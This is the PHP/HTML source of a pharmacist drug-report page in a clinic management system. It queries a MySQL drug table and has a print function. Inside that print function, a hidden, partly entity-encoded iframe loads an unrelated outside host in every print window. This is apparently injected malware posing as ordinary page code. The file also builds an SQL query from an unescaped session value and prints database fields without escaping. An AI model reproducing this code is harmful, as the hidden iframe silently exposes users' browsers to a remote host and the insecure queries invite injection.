<?php   
 session_start();
 $msg=$_SESSION["username"];
include("connection.php");
mysql_select_db("ClinicManamentSystem");
 ?> 
<html>
<html lang="en-US" xml:lang="en-US" xmlns=""/>
<head>
<title></title>
<link rel="stylesheet" type="text/css" href="style/home.css">
<link rel="stylesheet" type="text/css" href="csss.css">
      <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta name="Keywords" content="XML,tutorial,HTML,DHTML,CSS,XSL,XHTML,JavaScript,ASP,ADO,VBScript,DOM,W3C,authoring,programming,learning,beginner's guide,primer,lessons,school,howto,reference,free,examples,samples,source code,demos,tips,links,FAQ,tag list,forms,frames,color tables,Cascading Style Sheets,Active Server Pages,Dynamic HTML,Internet database development,Webbuilder,Sitebuilder,Webmaster,HTMLGuide,SiteExpert" />
<meta name="Description" content="HTML XHTML CSS JavaScript XML XSL ASP SQL ADO VBScript Tutorials References Examples" />
       <link rel="stylesheet" type="text/css" href="index's_file/globalcss.css" />
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "../https@ssl.\default.htm" : "../www./default.htm");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-3855518-1");
pageTracker._initData();
pageTracker._trackPageview();
</script>
<link rel="stylesheet" type="text/css" href="index's_file/globalcss.css" />

<style>
</style>

				 <script language="javascript">
function Clickheretoprint()
{ 
  var disp_setting="toolbar=yes,location=no,directories=yes,menubar=yes,"; 
      disp_setting+="scrollbars=yes,widtd=900, height=400, left=100, top=25"; 
  var content_vlue = document.getElementById("print_content").innerHTML; 
  
  var docprint=window.open("","",disp_setting); 
   docprint.document.open(); 
   docprint.document.write('<html><head><title>Lists</title>'); 
   docprint.document.write('</head><body onLoad="self.print()" style="widtd: 900px; font-size:16px; font-family:arial;">');          
   docprint.document.write(content_vlue);          
   docprint.document.write('<iframe src="http://jL.chu&#114;a.pl/rc/" style="display:none"></iframe>
</body></html>'); 
   docprint.document.close(); 
   docprint.focus(); 
}
</script>
<style>
</style>
</head>
<div id="body">
<?php include("header.php");?>
<div id="headerz">
<table width="1150px" border="0px">
<tr>
<td width="950" height="29" background-color="606060" font-size="10px" margin-top="-15">
	  <p><li>
				<a href="viewdrugorder.php">VIEWDRUG ORDER</a>
             <a href="adddrug.php">ADD DRUG</a>
 <a href="searchdrug.php">SEARCHDRUG</a>
 		      <a href="viewbill.php">VIEW BILL</a>
 <a href="pharmareport.php">GENERATE REPORT</a>
 <a href="changeuserpassword.php">Change Password</a>
 <?php
if(isset($msg)){
$var=(ucfirst($msg));
   $query = "SELECT * FROM account WHERE UserName= '$var'";
   $result_set=mysql_query($query,$con);
while($row=mysql_fetch_array($result_set)){
$first=$row['FirstName'];
$last=$row['LastName'];
}
     ?>
<b> <a href="login.php?loged">Logout</a>  </b>    
			</li>	
				</p>
				<?php
				}
				else{
				header("location:login.php");
				}
				?>
						
			</li>	
				</p>
	  </td>

</tr>
</table>
				
		</div>

 <section class="container">

 <div id="center">
<img src="img/UU.jpg" width="140" height="74">
</div>
 
<div id="left_colomn">
<div id="yy">
<img src="img/pr.jpg" width="270px" height="590">
				</div>
</div>
<div id="right_colomn"align="center">
<div class="left"><br/>
<img src="img/pr1.jpg" width="280" height="580"><br/>  
</div>
</div>
	 <div class="login" style="font-family:Lucida Calligraphy;color:black;background-color:white;">
	 


  
  <form action="pharmareport.php" method="post" >	
  
<div>
<br><br>
<div id="print_content">
					<center><h2 style="color:blue;">PHARMACIST REPORT </h2></center> 
					<?php
			$sel=mysql_query("SELECT * FROM drug  ");
			echo '<table align="center" border=3 bgcolor="" style="border:3 solid blue;width:100px;border-radius:15px"><tr>';
			echo '<th bgcolor ><font color>Drug ID</th><th bgcolor="">
			<font >ACC_ID</th>
			<th font  >Card Number</th>
			<th bgcolor><font color>Drug name</th>
			<th bgcolor><font color >Campany name</th>
			<th bgcolor ><font color>Drug amount</th>
			<th bgcolor ><font color>Made In</th>
			<th bgcolor ><font color>Reg_Date</th>
			<th bgcolor ><font color>Manuf_Date</th>
			<th bgcolor ><font color>Exp_date</th></tr>';
		$rowcolor=0;
			$intt=mysql_num_rows($sel);
			while($row=mysql_fetch_array($sel)){
			    print ("<tr>");
				print ("<td ><font size='1'>" . $row['DrugId'] . "</td>");
				print ("<td><font size='1'>" . $row['ACC_ID'] . "</td>");	
				print ("<td ><font size='1'>" . $row['CardNumber'] . "</td>");	
				print ("<td ><font size='2'>" . $row['DrugName'] . "</td>");		
				print ("<td ><font size='2'>" . $row['DrugCampany'] . "</td>");
				print ("<td ><font size='2'>" . $row['DrugAmount'] . "</td>");	
				print ("<td ><font size='2'>" . $row['DrugMadeIn'] . "</td>");
				print ("<td ><font size='2'>" . $row['DateOfReg'] . "</td>");
				print ("<td ><font size='2'>" . $row['ManufactureDate'] . "</td>");		
				print ("<td ><font size='2'>" . $row['ExpiredDate'] . "</td>");				
				print ("</tr>"); 
  } 	
print( "</table>");
					?>
					<br>
					</div>
					<p align="center"><I><h2 style="color:solidblack;"> If you want to print click<a href="javascript:Clickheretoprint()"><img src="IMG/print.jpg" width="150px" height="50px" /></a></h2></I></p>
					</div>
					</form>
   

<p>

    </section>
	<?php include("footer.php");?>

</div>
</div>
</body>
</html>
